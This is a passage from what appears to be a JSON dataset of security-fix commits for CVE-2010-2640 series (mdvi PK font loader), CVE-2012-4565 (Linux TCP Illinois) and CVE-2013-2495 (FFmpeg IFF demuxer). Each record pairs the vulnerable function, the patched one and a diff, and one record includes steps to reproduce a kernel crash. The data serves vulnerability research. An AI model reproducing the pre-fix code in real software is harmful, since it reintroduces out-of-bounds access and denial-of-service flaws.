        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "static int pk_load_font(DviParams *unused, DviFont *font)\n{\n\tint\ti;\n\tint\tflag_byte;\n\tint\tloc, hic, maxch;\n\tInt32\tchecksum;\n\tFILE\t*p;\n#ifndef NODEBUG\n\tchar\ts[256];\n#endif\n\tlong\talpha, beta, z;\n\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tp = font->in;\n\tmemzero(font->chars, 256 * sizeof(DviFontChar));\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\n\t/* check the preamble */\n\tloc = fuget1(p); hic = fuget1(p);\n\tif(loc != PK_PRE || hic != PK_ID)\n\t\tgoto badpk;\n\ti = fuget1(p);\n#ifndef NODEBUG\n\tfor(loc = 0; loc < i; loc++)\n\t\ts[loc] = fuget1(p);\n\ts[loc] = 0;\n\tDEBUG((DBG_FONTS, \"(pk) %s: %s\\n\", font->fontname, s));\n#else\n\tfseek(in, (long)i, SEEK_CUR);\n#endif\n\t/* get the design size */\n\tfont->design = fuget4(p);\n\t/* get the checksum */\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && font->checksum != checksum) {\n\t\tmdvi_warning(_(\"%s: checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\t/* skip pixel per point ratios */\n\tfuget4(p);\n\tfuget4(p);\n\tif(feof(p))\n\t\tgoto badpk;\t\n\n\t/* now start reading the font */\n\tloc = 256; hic = -1; maxch = 256;\n\t\n\t/* initialize alpha and beta for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\twhile((flag_byte = fuget1(p)) != PK_POST) {\n\t\tif(feof(p))\n\t\t\tbreak;\n\t\tif(flag_byte >= PK_CMD_START) {\n\t\t\tswitch(flag_byte) {\n\t\t\tcase PK_X1:\n\t\t\tcase PK_X2:\n\t\t\tcase PK_X3:\n\t\t\tcase PK_X4: {\n#ifndef NODEBUG\n\t\t\t\tchar\t*t;\n\t\t\t\tint\tn;\n\t\t\t\t\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\tif(i < 256)\n\t\t\t\t\tt = &s[0];\n\t\t\t\telse\n\t\t\t\t\tt = mdvi_malloc(i + 1);\n\t\t\t\tfor(n = 0; n < i; n++)\n\t\t\t\t\tt[n] = fuget1(p);\n\t\t\t\tt[n] = 0;\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: Special \\\"%s\\\"\\n\",\n\t\t\t\t\tfont->fontname, t));\n\t\t\t\tif(t != &s[0])\n\t\t\t\t\tmdvi_free(t);\n#else\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\twhile(i-- > 0)\n\t\t\t\t\tfuget1(p);\n#endif\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase PK_Y:\n\t\t\t\ti = fuget4(p);\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: MF special %u\\n\",\n\t\t\t\t\tfont->fontname, (unsigned)i));\n\t\t\t\tbreak;\n\t\t\tcase PK_POST:\n\t\t\tcase PK_NOOP:\n\t\t\t\tbreak;\n\t\t\tcase PK_PRE:\n\t\t\t\tmdvi_error(_(\"%s: unexpected preamble\\n\"), font->fontname);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t} else {\n\t\t\tint\tpl;\n\t\t\tint\tcc;\n\t\t\tint\tw, h;\n\t\t\tint\tx, y;\n\t\t\tint\toffset;\n\t\t\tlong\ttfm;\n\t\t\t\n\t\t\tswitch(flag_byte & 0x7) {\n\t\t\tcase 7:\n\t\t\t\tpl = fuget4(p);\n\t\t\t\tcc = fuget4(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget4(p);\n\t\t\t\tfsget4(p); /* skip dx */\n\t\t\t\tfsget4(p); /* skip dy */\n\t\t\t\tw  = fuget4(p);\n\t\t\t\th  = fuget4(p); \n\t\t\t\tx  = fsget4(p);\n\t\t\t\ty  = fsget4(p);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\tcase 5:\n\t\t\tcase 6:\t\t\t\t\n\t\t\t\tpl = (flag_byte % 4) * 65536 + fuget2(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget2(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget2(p);\n\t\t\t\th = fuget2(p);\n\t\t\t\tx = fsget2(p);\n\t\t\t\ty = fsget2(p);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tpl = (flag_byte % 4) * 256 + fuget1(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget1(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget1(p);\n\t\t\t\th = fuget1(p);\n\t\t\t\tx = fsget1(p);\n\t\t\t\ty = fsget1(p);\n\t\t\t}\n\t\t\tif(feof(p))\n\t\t\t\tbreak;\n\t\t\tif(cc < loc)\n\t\t\t\tloc = cc;\n\t\t\tif(cc > hic)\n\t\t\t\thic = cc;\n\t\t\tif(cc > maxch) {\n\t\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\t\tDviFontChar, cc + 16);\n\t\t\t\tfor(i = maxch; i < cc + 16; i++)\n\t\t\t\t\tfont->chars[i].offset = 0;\n\t\t\t\tmaxch = cc + 16;\n\t\t\t}\n\t\t\tfont->chars[cc].code = cc;\n\t\t\tfont->chars[cc].flags = flag_byte;\n\t\t\tfont->chars[cc].offset = ftell(p);\n\t\t\tfont->chars[cc].width = w;\n\t\t\tfont->chars[cc].height = h;\n\t\t\tfont->chars[cc].glyph.data = NULL;\n\t\t\tfont->chars[cc].x = x;\n\t\t\tfont->chars[cc].y = y;\n\t\t\tfont->chars[cc].glyph.x = x;\n\t\t\tfont->chars[cc].glyph.y = y;\n\t\t\tfont->chars[cc].glyph.w = w;\n\t\t\tfont->chars[cc].glyph.h = h;\n\t\t\tfont->chars[cc].grey.data = NULL;\n\t\t\tfont->chars[cc].shrunk.data = NULL;\n\t\t\tfont->chars[cc].tfmwidth = TFMSCALE(z, tfm, alpha, beta);\n\t\t\tfont->chars[cc].loaded = 0;\n\t\t\tfseek(p, (long)offset, SEEK_SET);\n\t\t}\n\t}\n\tif(flag_byte != PK_POST) {\n\t\tmdvi_error(_(\"%s: unexpected end of file (no postamble)\\n\"),\n\t\t\t   font->fontname);\n\t\tgoto error;\n\t}\n\twhile((flag_byte = fuget1(p)) != EOF) {\n\t\tif(flag_byte != PK_NOOP) {\n\t\t\tmdvi_error(_(\"invalid PK file! (junk in postamble)\\n\"));\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\t/* resize font char data */\n\tif(loc > 0 || hic < maxch-1) {\n\t\tmemmove(font->chars, font->chars + loc, \n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\t\t\n\treturn 0;\n\nbadpk:\n\tmdvi_error(_(\"%s: File corrupted, or not a PK file\\n\"), font->fontname);\nerror:\n\tmdvi_free(font->chars);\n\tfont->chars = NULL;\n\tfont->loc = font->hic = 0;\n\treturn -1;\n}",
        "func": "static int pk_load_font(DviParams *unused, DviFont *font)\n{\n\tint\ti;\n\tint\tflag_byte;\n\tint\tloc, hic, maxch;\n\tInt32\tchecksum;\n\tFILE\t*p;\n#ifndef NODEBUG\n\tchar\ts[256];\n#endif\n\tlong\talpha, beta, z;\n\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tp = font->in;\n\tmemzero(font->chars, 256 * sizeof(DviFontChar));\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\n\t/* check the preamble */\n\tloc = fuget1(p); hic = fuget1(p);\n\tif(loc != PK_PRE || hic != PK_ID)\n\t\tgoto badpk;\n\ti = fuget1(p);\n#ifndef NODEBUG\n\tfor(loc = 0; loc < i; loc++)\n\t\ts[loc] = fuget1(p);\n\ts[loc] = 0;\n\tDEBUG((DBG_FONTS, \"(pk) %s: %s\\n\", font->fontname, s));\n#else\n\tfseek(in, (long)i, SEEK_CUR);\n#endif\n\t/* get the design size */\n\tfont->design = fuget4(p);\n\t/* get the checksum */\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && font->checksum != checksum) {\n\t\tmdvi_warning(_(\"%s: checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\t/* skip pixel per point ratios */\n\tfuget4(p);\n\tfuget4(p);\n\tif(feof(p))\n\t\tgoto badpk;\t\n\n\t/* now start reading the font */\n\tloc = 256; hic = -1; maxch = 256;\n\t\n\t/* initialize alpha and beta for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\twhile((flag_byte = fuget1(p)) != PK_POST) {\n\t\tif(feof(p))\n\t\t\tbreak;\n\t\tif(flag_byte >= PK_CMD_START) {\n\t\t\tswitch(flag_byte) {\n\t\t\tcase PK_X1:\n\t\t\tcase PK_X2:\n\t\t\tcase PK_X3:\n\t\t\tcase PK_X4: {\n#ifndef NODEBUG\n\t\t\t\tchar\t*t;\n\t\t\t\tint\tn;\n\t\t\t\t\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\tif(i < 256)\n\t\t\t\t\tt = &s[0];\n\t\t\t\telse\n\t\t\t\t\tt = mdvi_malloc(i + 1);\n\t\t\t\tfor(n = 0; n < i; n++)\n\t\t\t\t\tt[n] = fuget1(p);\n\t\t\t\tt[n] = 0;\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: Special \\\"%s\\\"\\n\",\n\t\t\t\t\tfont->fontname, t));\n\t\t\t\tif(t != &s[0])\n\t\t\t\t\tmdvi_free(t);\n#else\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\twhile(i-- > 0)\n\t\t\t\t\tfuget1(p);\n#endif\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase PK_Y:\n\t\t\t\ti = fuget4(p);\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: MF special %u\\n\",\n\t\t\t\t\tfont->fontname, (unsigned)i));\n\t\t\t\tbreak;\n\t\t\tcase PK_POST:\n\t\t\tcase PK_NOOP:\n\t\t\t\tbreak;\n\t\t\tcase PK_PRE:\n\t\t\t\tmdvi_error(_(\"%s: unexpected preamble\\n\"), font->fontname);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t} else {\n\t\t\tint\tpl;\n\t\t\tint\tcc;\n\t\t\tint\tw, h;\n\t\t\tint\tx, y;\n\t\t\tint\toffset;\n\t\t\tlong\ttfm;\n\t\t\t\n\t\t\tswitch(flag_byte & 0x7) {\n\t\t\tcase 7:\n\t\t\t\tpl = fuget4(p);\n\t\t\t\tcc = fuget4(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget4(p);\n\t\t\t\tfsget4(p); /* skip dx */\n\t\t\t\tfsget4(p); /* skip dy */\n\t\t\t\tw  = fuget4(p);\n\t\t\t\th  = fuget4(p); \n\t\t\t\tx  = fsget4(p);\n\t\t\t\ty  = fsget4(p);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\tcase 5:\n\t\t\tcase 6:\t\t\t\t\n\t\t\t\tpl = (flag_byte % 4) * 65536 + fuget2(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget2(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget2(p);\n\t\t\t\th = fuget2(p);\n\t\t\t\tx = fsget2(p);\n\t\t\t\ty = fsget2(p);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tpl = (flag_byte % 4) * 256 + fuget1(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget1(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget1(p);\n\t\t\t\th = fuget1(p);\n\t\t\t\tx = fsget1(p);\n\t\t\t\ty = fsget1(p);\n\t\t\t}\n\t\t\tif(feof(p))\n\t\t\t\tbreak;\n\n\t\t\t/* Although the PK format support bigger char codes,\n                         * XeTeX and other extended TeX engines support charcodes up to\n                         * 65536, while normal TeX engine supports only charcode up to 255.*/\n\t\t\tif (cc < 0 || cc > 65536) {\n\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n\t\t\t\t\t    font->fontname,cc);\n\t\t\t\tgoto error;\n\t\t\t} \n\t\t\tif(cc < loc)\n\t\t\t\tloc = cc;\n\t\t\tif(cc > hic)\n\t\t\t\thic = cc;\n\t\t\tif(cc > maxch) {\n\t\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\t\tDviFontChar, cc + 16);\n\t\t\t\tfor(i = maxch; i < cc + 16; i++)\n\t\t\t\t\tfont->chars[i].offset = 0;\n\t\t\t\tmaxch = cc + 16;\n\t\t\t}\n\t\t\tfont->chars[cc].code = cc;\n\t\t\tfont->chars[cc].flags = flag_byte;\n\t\t\tfont->chars[cc].offset = ftell(p);\n\t\t\tfont->chars[cc].width = w;\n\t\t\tfont->chars[cc].height = h;\n\t\t\tfont->chars[cc].glyph.data = NULL;\n\t\t\tfont->chars[cc].x = x;\n\t\t\tfont->chars[cc].y = y;\n\t\t\tfont->chars[cc].glyph.x = x;\n\t\t\tfont->chars[cc].glyph.y = y;\n\t\t\tfont->chars[cc].glyph.w = w;\n\t\t\tfont->chars[cc].glyph.h = h;\n\t\t\tfont->chars[cc].grey.data = NULL;\n\t\t\tfont->chars[cc].shrunk.data = NULL;\n\t\t\tfont->chars[cc].tfmwidth = TFMSCALE(z, tfm, alpha, beta);\n\t\t\tfont->chars[cc].loaded = 0;\n\t\t\tfseek(p, (long)offset, SEEK_SET);\n\t\t}\n\t}\n\tif(flag_byte != PK_POST) {\n\t\tmdvi_error(_(\"%s: unexpected end of file (no postamble)\\n\"),\n\t\t\t   font->fontname);\n\t\tgoto error;\n\t}\n\twhile((flag_byte = fuget1(p)) != EOF) {\n\t\tif(flag_byte != PK_NOOP) {\n\t\t\tmdvi_error(_(\"invalid PK file! (junk in postamble)\\n\"));\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\t/* resize font char data */\n\tif(loc > 0 && hic < maxch-1) {\n\t\tmemmove(font->chars, font->chars + loc, \n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\t\t\n\treturn 0;\n\nbadpk:\n\tmdvi_error(_(\"%s: File corrupted, or not a PK file\\n\"), font->fontname);\nerror:\n\tmdvi_free(font->chars);\n\tfont->chars = NULL;\n\tfont->loc = font->hic = 0;\n\treturn -1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -143,6 +143,15 @@\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -186,7 +195,7 @@\n \t}\n \n \t/* resize font char data */\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,",
        "diff_line_info": {
            "deleted_lines": [
                "\tif(loc > 0 || hic < maxch-1) {"
            ],
            "added_lines": [
                "",
                "\t\t\t/* Although the PK format support bigger char codes,",
                "                         * XeTeX and other extended TeX engines support charcodes up to",
                "                         * 65536, while normal TeX engine supports only charcode up to 255.*/",
                "\t\t\tif (cc < 0 || cc > 65536) {",
                "\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),",
                "\t\t\t\t\t    font->fontname,cc);",
                "\t\t\t\tgoto error;",
                "\t\t\t} ",
                "\tif(loc > 0 && hic < maxch-1) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-4565",
        "func_name": "torvalds/linux/tcp_illinois_info",
        "description": "The tcp_illinois_info function in net/ipv4/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.",
        "git_url": "https://github.com/torvalds/linux/commit/8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664",
        "commit_title": "net: fix divide by zero in tcp algorithm illinois",
        "commit_text": " Reading TCP stats when using TCP Illinois congestion control algorithm can cause a divide by zero kernel oops.  The division by zero occur in tcp_illinois_info() at:  do_div(t, ca->cnt_rtt); where ca->cnt_rtt can become zero (when rtt_reset is called)  Steps to Reproduce:  1. Register tcp_illinois:      # sysctl -w net.ipv4.tcp_congestion_control=illinois  2. Monitor internal TCP information via command \"ss -i\"      # watch -d ss -i  3. Establish new TCP conn to machine  Either it fails at the initial conn, or else it needs to wait for a loss or a reset.  This is only related to reading stats.  The function avg_delay() also performs the same divide, but is guarded with a (ca->cnt_rtt > 0) at its calling point in update_params().  Thus, simply fix tcp_illinois_info().  Function tcp_illinois_info() / get_info() is called without socket lock.  Thus, eliminate any race condition on ca->cnt_rtt by using a local stack variable.  Simply reuse info.tcpv_rttcnt, as its already set to ca->cnt_rtt. Function avg_delay() is not affected by this race condition, as its called with the socket lock.  Cc: Petr Matousek <pmatouse@redhat.com>",
        "func_before": "static void tcp_illinois_info(struct sock *sk, u32 ext,\n\t\t\t      struct sk_buff *skb)\n{\n\tconst struct illinois *ca = inet_csk_ca(sk);\n\n\tif (ext & (1 << (INET_DIAG_VEGASINFO - 1))) {\n\t\tstruct tcpvegas_info info = {\n\t\t\t.tcpv_enabled = 1,\n\t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n\t\t\t.tcpv_minrtt = ca->base_rtt,\n\t\t};\n\t\tu64 t = ca->sum_rtt;\n\n\t\tdo_div(t, ca->cnt_rtt);\n\t\tinfo.tcpv_rtt = t;\n\n\t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n\t}\n}",
        "func": "static void tcp_illinois_info(struct sock *sk, u32 ext,\n\t\t\t      struct sk_buff *skb)\n{\n\tconst struct illinois *ca = inet_csk_ca(sk);\n\n\tif (ext & (1 << (INET_DIAG_VEGASINFO - 1))) {\n\t\tstruct tcpvegas_info info = {\n\t\t\t.tcpv_enabled = 1,\n\t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n\t\t\t.tcpv_minrtt = ca->base_rtt,\n\t\t};\n\n\t\tif (info.tcpv_rttcnt > 0) {\n\t\t\tu64 t = ca->sum_rtt;\n\n\t\t\tdo_div(t, info.tcpv_rttcnt);\n\t\t\tinfo.tcpv_rtt = t;\n\t\t}\n\t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n\t}\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -9,11 +9,13 @@\n \t\t\t.tcpv_rttcnt = ca->cnt_rtt,\n \t\t\t.tcpv_minrtt = ca->base_rtt,\n \t\t};\n-\t\tu64 t = ca->sum_rtt;\n \n-\t\tdo_div(t, ca->cnt_rtt);\n-\t\tinfo.tcpv_rtt = t;\n+\t\tif (info.tcpv_rttcnt > 0) {\n+\t\t\tu64 t = ca->sum_rtt;\n \n+\t\t\tdo_div(t, info.tcpv_rttcnt);\n+\t\t\tinfo.tcpv_rtt = t;\n+\t\t}\n \t\tnla_put(skb, INET_DIAG_VEGASINFO, sizeof(info), &info);\n \t}\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tu64 t = ca->sum_rtt;",
                "\t\tdo_div(t, ca->cnt_rtt);",
                "\t\tinfo.tcpv_rtt = t;"
            ],
            "added_lines": [
                "\t\tif (info.tcpv_rttcnt > 0) {",
                "\t\t\tu64 t = ca->sum_rtt;",
                "\t\t\tdo_div(t, info.tcpv_rttcnt);",
                "\t\t\tinfo.tcpv_rtt = t;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2013-2495",
        "func_name": "ffmpeg/iff_read_header",
        "description": "The iff_read_header function in iff.c in libavformat in FFmpeg through 1.1.3 does not properly handle data sizes for Interchange File Format (IFF) data during operations involving a CMAP chunk or a video codec, which allows remote attackers to cause a denial of service (integer overflow, out-of-bounds array access, and application crash) or possibly have unspecified other impact via a crafted header.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=3dbc0ff9c3e6f6e0d08ea3d42cb33761bae084ba",
        "commit_title": "",
        "commit_text": "iff: fix integer overflow  Fixes out of array accesses  ",
        "func_before": "static int iff_read_header(AVFormatContext *s)\n{\n    IffDemuxContext *iff = s->priv_data;\n    AVIOContext *pb = s->pb;\n    AVStream *st;\n    uint8_t *buf;\n    uint32_t chunk_id, data_size;\n    uint32_t screenmode = 0, num, den;\n    unsigned transparency = 0;\n    unsigned masking = 0; // no mask\n    uint8_t fmt[16];\n    int fmt_size;\n\n    st = avformat_new_stream(s, NULL);\n    if (!st)\n        return AVERROR(ENOMEM);\n\n    st->codec->channels = 1;\n    st->codec->channel_layout = AV_CH_LAYOUT_MONO;\n    avio_skip(pb, 8);\n    // codec_tag used by ByteRun1 decoder to distinguish progressive (PBM) and interlaced (ILBM) content\n    st->codec->codec_tag = avio_rl32(pb);\n    iff->bitmap_compression = -1;\n    iff->svx8_compression = -1;\n    iff->maud_bits = -1;\n    iff->maud_compression = -1;\n\n    while(!url_feof(pb)) {\n        uint64_t orig_pos;\n        int res;\n        const char *metadata_tag = NULL;\n        chunk_id = avio_rl32(pb);\n        data_size = avio_rb32(pb);\n        orig_pos = avio_tell(pb);\n\n        switch(chunk_id) {\n        case ID_VHDR:\n            st->codec->codec_type = AVMEDIA_TYPE_AUDIO;\n\n            if (data_size < 14)\n                return AVERROR_INVALIDDATA;\n            avio_skip(pb, 12);\n            st->codec->sample_rate = avio_rb16(pb);\n            if (data_size >= 16) {\n                avio_skip(pb, 1);\n                iff->svx8_compression = avio_r8(pb);\n            }\n            break;\n\n        case ID_MHDR:\n            st->codec->codec_type = AVMEDIA_TYPE_AUDIO;\n\n            if (data_size < 32)\n                return AVERROR_INVALIDDATA;\n            avio_skip(pb, 4);\n            iff->maud_bits = avio_rb16(pb);\n            avio_skip(pb, 2);\n            num = avio_rb32(pb);\n            den = avio_rb16(pb);\n            if (!den)\n                return AVERROR_INVALIDDATA;\n            avio_skip(pb, 2);\n            st->codec->sample_rate = num / den;\n            st->codec->channels = avio_rb16(pb);\n            iff->maud_compression = avio_rb16(pb);\n            if (st->codec->channels == 1)\n                st->codec->channel_layout = AV_CH_LAYOUT_MONO;\n            else if (st->codec->channels == 2)\n                st->codec->channel_layout = AV_CH_LAYOUT_STEREO;\n            break;\n\n        case ID_ABIT:\n        case ID_BODY:\n        case ID_DBOD:\n        case ID_MDAT:\n            iff->body_pos = avio_tell(pb);\n            iff->body_end = iff->body_pos + data_size;\n            iff->body_size = data_size;\n            break;\n\n        case ID_CHAN:\n            if (data_size < 4)\n                return AVERROR_INVALIDDATA;\n            if (avio_rb32(pb) < 6) {\n                st->codec->channels       = 1;\n                st->codec->channel_layout = AV_CH_LAYOUT_MONO;\n            } else {\n                st->codec->channels       = 2;\n                st->codec->channel_layout = AV_CH_LAYOUT_STEREO;\n            }\n            break;\n\n        case ID_CAMG:\n            if (data_size < 4)\n                return AVERROR_INVALIDDATA;\n            screenmode                = avio_rb32(pb);\n            break;\n\n        case ID_CMAP:\n            st->codec->extradata_size = data_size + IFF_EXTRA_VIDEO_SIZE;\n            st->codec->extradata      = av_malloc(data_size + IFF_EXTRA_VIDEO_SIZE + FF_INPUT_BUFFER_PADDING_SIZE);\n            if (!st->codec->extradata)\n                return AVERROR(ENOMEM);\n            if (avio_read(pb, st->codec->extradata + IFF_EXTRA_VIDEO_SIZE, data_size) < 0)\n                return AVERROR(EIO);\n            break;\n\n        case ID_BMHD:\n            st->codec->codec_type            = AVMEDIA_TYPE_VIDEO;\n            if (data_size <= 8)\n                return AVERROR_INVALIDDATA;\n            st->codec->width                 = avio_rb16(pb);\n            st->codec->height                = avio_rb16(pb);\n            avio_skip(pb, 4); // x, y offset\n            st->codec->bits_per_coded_sample = avio_r8(pb);\n            if (data_size >= 10)\n                masking                      = avio_r8(pb);\n            if (data_size >= 11)\n                iff->bitmap_compression      = avio_r8(pb);\n            if (data_size >= 14) {\n                avio_skip(pb, 1); // padding\n                transparency                 = avio_rb16(pb);\n            }\n            if (data_size >= 16) {\n                st->sample_aspect_ratio.num  = avio_r8(pb);\n                st->sample_aspect_ratio.den  = avio_r8(pb);\n            }\n            break;\n\n        case ID_DPEL:\n            if (data_size < 4 || (data_size & 3))\n                return AVERROR_INVALIDDATA;\n            if ((fmt_size = avio_read(pb, fmt, sizeof(fmt))) < 0)\n                return fmt_size;\n            if (fmt_size == sizeof(deep_rgb24) && !memcmp(fmt, deep_rgb24, sizeof(deep_rgb24)))\n                st->codec->pix_fmt = AV_PIX_FMT_RGB24;\n            else if (fmt_size == sizeof(deep_rgba) && !memcmp(fmt, deep_rgba, sizeof(deep_rgba)))\n                st->codec->pix_fmt = AV_PIX_FMT_RGBA;\n            else if (fmt_size == sizeof(deep_bgra) && !memcmp(fmt, deep_bgra, sizeof(deep_bgra)))\n                st->codec->pix_fmt = AV_PIX_FMT_BGRA;\n            else if (fmt_size == sizeof(deep_argb) && !memcmp(fmt, deep_argb, sizeof(deep_argb)))\n                st->codec->pix_fmt = AV_PIX_FMT_ARGB;\n            else if (fmt_size == sizeof(deep_abgr) && !memcmp(fmt, deep_abgr, sizeof(deep_abgr)))\n                st->codec->pix_fmt = AV_PIX_FMT_ABGR;\n            else {\n                av_log_ask_for_sample(s, \"unsupported color format\\n\");\n                return AVERROR_PATCHWELCOME;\n            }\n            break;\n\n        case ID_DGBL:\n            st->codec->codec_type            = AVMEDIA_TYPE_VIDEO;\n            if (data_size < 8)\n                return AVERROR_INVALIDDATA;\n            st->codec->width                 = avio_rb16(pb);\n            st->codec->height                = avio_rb16(pb);\n            iff->bitmap_compression          = avio_rb16(pb);\n            st->sample_aspect_ratio.num      = avio_r8(pb);\n            st->sample_aspect_ratio.den      = avio_r8(pb);\n            st->codec->bits_per_coded_sample = 24;\n            break;\n\n        case ID_DLOC:\n            if (data_size < 4)\n                return AVERROR_INVALIDDATA;\n            st->codec->width  = avio_rb16(pb);\n            st->codec->height = avio_rb16(pb);\n            break;\n\n        case ID_TVDC:\n            if (data_size < sizeof(iff->tvdc))\n                return AVERROR_INVALIDDATA;\n            res = avio_read(pb, iff->tvdc, sizeof(iff->tvdc));\n            if (res < 0)\n                return res;\n            break;\n\n        case ID_ANNO:\n        case ID_TEXT:      metadata_tag = \"comment\";   break;\n        case ID_AUTH:      metadata_tag = \"artist\";    break;\n        case ID_COPYRIGHT: metadata_tag = \"copyright\"; break;\n        case ID_NAME:      metadata_tag = \"title\";     break;\n        }\n\n        if (metadata_tag) {\n            if ((res = get_metadata(s, metadata_tag, data_size)) < 0) {\n                av_log(s, AV_LOG_ERROR, \"cannot allocate metadata tag %s!\\n\", metadata_tag);\n                return res;\n            }\n        }\n        avio_skip(pb, data_size - (avio_tell(pb) - orig_pos) + (data_size & 1));\n    }\n\n    avio_seek(pb, iff->body_pos, SEEK_SET);\n\n    switch(st->codec->codec_type) {\n    case AVMEDIA_TYPE_AUDIO:\n        avpriv_set_pts_info(st, 32, 1, st->codec->sample_rate);\n\n        if (st->codec->codec_tag == ID_16SV)\n            st->codec->codec_id = AV_CODEC_ID_PCM_S16BE_PLANAR;\n        else if (st->codec->codec_tag == ID_MAUD) {\n            if (iff->maud_bits == 8 && !iff->maud_compression) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_U8;\n            } else if (iff->maud_bits == 16 && !iff->maud_compression) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_S16BE;\n            } else if (iff->maud_bits ==  8 && iff->maud_compression == 2) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_ALAW;\n            } else if (iff->maud_bits ==  8 && iff->maud_compression == 3) {\n                st->codec->codec_id = AV_CODEC_ID_PCM_MULAW;\n            } else {\n                av_log_ask_for_sample(s, \"unsupported compression %d and bit depth %d\\n\", iff->maud_compression, iff->maud_bits);\n                return AVERROR_PATCHWELCOME;\n            }\n\n            st->codec->bits_per_coded_sample =\n                av_get_bits_per_sample(st->codec->codec_id);\n\n            st->codec->block_align =\n                st->codec->bits_per_coded_sample * st->codec->channels / 8;\n        } else {\n        switch (iff->svx8_compression) {\n        case COMP_NONE:\n            st->codec->codec_id = AV_CODEC_ID_PCM_S8_PLANAR;\n            break;\n        case 